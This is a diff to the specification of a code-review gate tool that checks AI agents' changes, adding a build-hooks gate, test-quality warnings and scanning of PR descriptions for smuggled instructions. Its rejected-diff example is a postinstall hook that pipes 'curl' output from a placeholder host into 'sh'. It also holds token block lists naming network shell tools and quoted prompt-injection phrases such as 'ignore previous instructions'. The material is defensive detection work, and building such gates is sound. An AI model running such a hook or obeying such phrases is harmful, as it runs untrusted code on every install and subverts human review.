@@ -33,6 +33,7 @@ This document establishes the normative enforcement rules, detection capabilitie
 | [`stub-bodies`](#stub-bodies) | agent-guard | **shipped** | Rust, Python, JS/TS, Go, Java, C# | added functions are not stubs; existing bodies are not replaced by todo!() / NotImplementedError / return null |
 | [`error-swallowing`](#error-swallowing) | agent-guard | **shipped** | Rust, Python, JS/TS, Go, Java, C# | no new empty error handler or discarded Result outside tests |
 | [`instruction-smuggling`](#instruction-smuggling) | agent-guard | **shipped** | any (invisible characters, instruction files); Rust, Python, JS/TS, Go, Java, C# and prose files (phrases) | no invisible Unicode, unreviewed agent-instruction edits, or instruction-like text in comments and prose |
+| [`build-hooks`](#build-hooks) | integrity | **shipped** | package.json, build.rs, setup.py, .npmrc, .pypirc, pip.conf, .cargo/config.toml, .env* | install and build hooks that gain network or shell access, and package-manager configuration edits, need a token |
 | [`toolchain-config`](#toolchain-config) | integrity | **shipped** | tsconfig, ruff, mypy, pytest, coverage, flake8, Cargo lints, rustflags, nextest, eslintrc, golangci, jest, codecov, phpstan, phpunit | compiler, linter, type-checker, test-runner and coverage configuration cannot be loosened without a token |
 | [`scope-confinement`](#scope-confinement) | agent-guard | **shipped** | any | changes stay inside authorized paths |
 | [`suppression-delta`](#suppression-delta) | agent-guard | **shipped** | per pack | newly added linter / compiler suppression annotations |
@@ -115,6 +116,7 @@ A default is chosen from two inputs: **detection confidence** (how often a findi
 | `instruction-smuggling` | on, `error` (invisible characters, instruction files) / `warning` (phrases, encoded blobs) | High for a bidi override or a zero-width character: the code point is either there or not. High for an instruction-file edit: the path is the fact. Low for a phrase: a paraphrase defeats it. | False block: a localisation table with directional marks needs `exempt_paths` or a directive; every `AGENTS.md` edit needs a directive. Miss: any injection that avoids the phrase list. | What a reviewer sees must be what the parser reads; what the next agent reads must be reviewed as code. The phrase tier is a tripwire and is reported as one. |
 | `error-swallowing` | on, `error` | High: the handler body is read from the syntax tree; base and head are compared per file as a multiset, so a moved handler is not new. | False block: a deliberate best-effort handler needs `allow-swallow:` or an inline marker. Miss: a handler that logs and swallows, a discarded result the language does not mark (`_`). | An empty `catch` or a discarded `Result` is how a failure an agent cannot fix stops surfacing. |
 | `stub-bodies` | on, `error` | High: the body is read from the syntax tree and is the whole body; base and head are compared per function. | False block: a deliberate placeholder needs `allow-stub:`. Miss: a stub that carries one extra statement, or a body that special-cases the inputs its tests use. | An added `todo!()` or a body replaced by `return null` is the change no other gate sees. |
+| `build-hooks` | on, `error` | High for a lifecycle script or a manager-config path: the JSON key or the path is the fact. Medium for a build-script line: token match on added lines. | False block: a `prepare: husky` hook or a private-registry `.npmrc` needs `allow-build-hook:`. Miss: a hook that shells out through a script file the token list does not see. | Code that runs on every install is the workflow an agent can still reach after `ci-integrity` closes the workflow files. |
 | `toolchain-config` | on, `error` | High for a data file: base and head are diffed structurally against a per-tool rule table. A configuration written as code is reported at `warning` as changed, not analysed. | False block: an intended loosening needs `allow-toolchain-weakening:`. Miss: a lint or type bar lowered in the same change that would have failed it. | Same stakes as `ci-integrity` dropping `-D warnings`, one file over. |
 | `ci-integrity` | on, `error` | High for `continue-on-error`, `\|\| true` and unpinned actions in modified workflows (`diff_only = true`). | False block: an intended pattern needs `allow-ci-weakening:`. Miss: a rollup that reports green while a job is skipped. | Only modified workflows are scanned by default, so pre-existing patterns do not block adoption. |
 | `ci-skip-set` | on, `error` | High: each `needs` result is compared to its job's `if:` evaluated over the observed filter outputs; an unmodelled term is a finding, not a guess. Inert (a named "not evaluated" note) unless the rollup job supplies `DISCIPLINE_CI_CONTEXT`. | False block: a rollup whose workflow uses an `if:` form outside the modelled subset. Miss: a skip set the evaluator cannot distinguish from a legitimate one (all filters false on a change that touches no filtered path), reported as a note. | Supplying the context is the opt-in, so enabling it by default costs an ordinary diff check nothing. |
@@ -206,6 +208,7 @@ Certain gates distinguish high-confidence rules from heuristic indicators within
   - Verbatim tautologies: `assert_eq!(x, x)`, `assert_eq!(1, 1)`, `assert!(true)`.
   - Constant expression tautologies: `assert!(1 == 1)`, `assert!(1 + 1 > 0)`, `assert_ne!(1, 2)`.
   - Empty PHPT expectation sections.
+  - `Test Asserts Only Trivial Properties` (warning): a new test whose every assertion holds for nearly any value (`is not None`, `assertIsNotNone`, `toBeDefined`, `toBeTruthy`, `.is_ok()`, `.is_some()`, `NotNil`, `assertNotNull`); it checks that something came back, not what.
   - `Test Asserts Only On Mocks` (warning): a new test whose every assertion is on a double's interactions (`assert_called_with`, `toHaveBeenCalled`, `verify(`, `.Received(`, ...; `mock_assert_fns` extends the vocabulary) and none on what the code produces. Such a test passes whatever the code returns. Mock usage is read from the call nodes inside each test body (`src/ast/mocks.rs`), for Rust, Python, JS/TS, Go, Java and C#.
 - **Failing diff example (rejected):**
   ```python
@@ -243,6 +246,7 @@ Certain gates distinguish high-confidence rules from heuristic indicators within
   - Python: `@pytest.mark.skip`, `@pytest.mark.skipif`, `@pytest.mark.xfail`, `@unittest.skip`, `@unittest.skipIf`.
   - JavaScript / TypeScript: `it.skip`, `test.skip`, `xit`, `xtest`, `describe.skip`, `xdescribe`, `it.todo`.
   - PHPT: newly added `--SKIPIF--` or `--XFAIL--` sections.
+  - `Test Sleeps` (warning): a test that gains a hard-coded delay (`thread::sleep`, `time.sleep`, `setTimeout`, `Thread.sleep`, `Task.Delay`, ...) or arrives with one; a timing-dependent pass slows the suite and hides the race. Lifted by `allow-ignore: <test> <reason>`.
   - `Test Retries On Failure`: a test that gains a retry / flaky marker, or arrives with one (`@pytest.mark.flaky`, `@flaky`, `jest.retryTimes` at file level, `this.retries(`, vitest `{ retry: n }`, `@RetryingTest`, `[Retry(`, `flaky_test`, RSpec `retry:`; `src/ast/retries.rs`). A retry does not skip the test; it lets a failure through as often as the marker allows. Lifted by `allow-ignore: <test> <reason>`. Rust, Python, JS/TS, Go, Java, C#.
   - Java: `@Disabled`, `@Ignore`, `@Test(enabled = false)` (including class-level annotations propagating to all methods).
   - Go: `t.Skip`, `t.Skipf`, `t.SkipNow`.
@@ -295,6 +299,7 @@ Certain gates distinguish high-confidence rules from heuristic indicators within
   1. **Invisible and bidirectional Unicode** in added lines of any text file: zero-width characters (U+200B–U+200F, U+2060–U+2064, U+FEFF away from the start of the file, U+00AD), bidirectional embeddings, overrides and isolates (U+202A–U+202E, U+2066–U+2069), Unicode tag characters (U+E0000–U+E007F). What a reviewer sees is not what a parser or an agent reads. Blocking.
   2. **Agent-instruction files**: `AGENTS.md`, `AGENT.md`, `CLAUDE.md`, `GEMINI.md`, `.cursorrules`, `.clinerules`, `.windsurfrules`, `.aider.conf.yml`, `copilot-instructions.md`, `SKILL.md`, and anything under `.cursor/rules/`, `.claude/`, `.codex/`, `.roo/`, `.github/instructions/`, `.github/prompts/`. Any edit is reported; what these files say is what the next agent will do, so the edit is reviewed as code and recorded with a directive. Blocking.
   3. **Instruction phrases and encoded blobs** in comments, docstrings and string literals of code (`Fact::Prose`, Rust, Python, JS/TS, Go, Java, C#) and in whole added lines of prose and configuration files (`.md`, `.txt`, `.rst`, `.yml`, `.toml`, `.json`, `.html`, ...): instruction overrides (`ignore previous instructions`), role overrides and chat role markers (`<|im_start|>`, `### Instruction:`, `Assistant:`), concealment (`do not tell the user`), exfiltration (`print your system prompt`), reviewer steering (`approve this pull request`), and a base64 run of 80 or more characters that mixes cases and digits (hex digests, URLs, paths and `sha256-` / `sha512-` integrity values are excluded by shape). Heuristic and paraphrasable: **warning**, a tripwire, not a defence.
+  4. **The change description**: the PR title and body and every commit message in the range are scanned for the same phrase classes and invisible characters (`Instruction-Like Text In Change Description`, warning; `Invisible Characters In Change Description`, blocking). A review bot reads these before the diff. Directive lines (`allow-...:`) are the repository's own vocabulary and are not scanned. Lifted by `allow-agent-instructions: pr-body|pr-title|commit:<sha7> <reason>`.
 - **Location only:** every finding names the file, the line and the class (`instruction-override`, `bidirectional-control`, `encoded-blob`), never the matched text. The report is read by the next agent, including through `--format agent-prompt`; echoing the text would deliver the injection. That format prints violation titles, messages and locations only, never override reasons.
 - **Languages:** any (checks 1 and 2); Rust, Python, JS/TS, Go, Java, C# and prose files (check 3).
 - **Failing diff (rejected):**
@@ -652,6 +657,32 @@ Certain gates distinguish high-confidence rules from heuristic indicators within
   - Tightening edits (enabling gates, adding denylists, raising severity) — tightening is permitted freely.
   - Workflow-level switches (`disable:` in GitHub Actions steps) — protected by `ci-integrity`.
 - **Lifting directive:** `allow-gate-weakening: <gate-id> <reason>` in PR description or commit message.
+- **Config keys:** `enabled`, `severity`, `exempt_paths`.
+
+#### `build-hooks`
+- **Rule:** Code that runs unasked when a package is installed or built, and the configuration that decides where packages come from, cannot change without a directive. `ci-integrity` closes the workflow files; this gate closes the other place an agent can run a command on every install.
+- **Languages:** `package.json` lifecycle scripts (`preinstall`, `install`, `postinstall`, `prepare`, `prepublish`, `prepublishOnly`, `prepack`, `postpack`, `preuninstall`, `postuninstall`); build scripts (`build.rs`, `setup.py`, `Makefile.PL`, `binding.gyp`); package-manager configuration (`.npmrc`, `.yarnrc`, `.yarnrc.yml`, `.pypirc`, `pip.conf`, `.cargo/config.toml`, `Pipfile`, `.gemrc`, `.env*`).
+- **What it catches:**
+  - `Install Hook Added`: a lifecycle script that is new or whose body changed (a non-lifecycle script such as `test` is not a hook).
+  - `Install Hook Runs Network Or Shell`: the same, when the body carries `curl`, `wget`, `nc`, `/dev/tcp/`, `bash -c`, `eval`, `base64 -d`, `python -c`, `node -e`, `powershell`, a URL, or `chmod +x`.
+  - `Build Script Added`; `Build Script Gains Network Or Shell Access`: an added line of a build script carrying a process, network or shell token (`std::process::Command`, `subprocess`, `child_process`, `reqwest`, `urllib`, `fetch(`, ...).
+  - `Package Manager Configuration Changed`: any add, edit or delete of a manager-config path.
+- **Failing diff (rejected):**
+  ```diff
+  - "postinstall": "node scripts/patch.js",
+  + "postinstall": "curl -s https://x.example/s | sh",
+  ```
+- **Passing commit / PR body (accepted):**
+  ```text
+  allow-build-hook: prepare husky installs the commit hooks
+  allow-build-hook: .npmrc the private registry needs the scoped token
+  ```
+- **What it does NOT catch:**
+  - A hook that runs a script file (`node scripts/setup.js`) whose contents do the reaching out: the token list reads the hook line, not the file it runs.
+  - An unchanged hook, and lines of a build script that did not change.
+  - `Makefile` targets, `pyproject.toml` `[build-system]` requirements (see `dependency-delta`), Gradle or Maven plugins.
+- **Lifting directive:** `allow-build-hook: <hook-name-or-path> <reason>`.
+- **Default:** on, `error`.
 - **Config keys:** `enabled`, `severity`, `exempt_paths`.
 
 #### `toolchain-config`
